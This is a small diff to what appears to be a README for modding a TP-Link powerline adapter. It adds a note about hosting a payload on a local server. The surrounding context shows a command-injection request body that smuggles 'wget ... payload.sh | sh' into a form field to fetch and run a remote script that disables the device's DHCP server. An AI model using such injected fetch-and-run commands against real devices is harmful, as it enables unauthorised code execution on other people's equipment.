@@ -55,6 +55,7 @@ If the powerline has internet access, it is easier to change the body to
 ```
 "operation=remove&key=1;wget -q -O - http://github.com/iansw246/tl-wpa9610-mods/raw/main/disable-dhcp/payload.sh | sh"
 ```
+or host your own local HTTP/FTP server with the payload.
 
 This disables the DHCP server by running the script downloaded from the internet and doesn't require any other commands. Read some [final notes](#done)
 
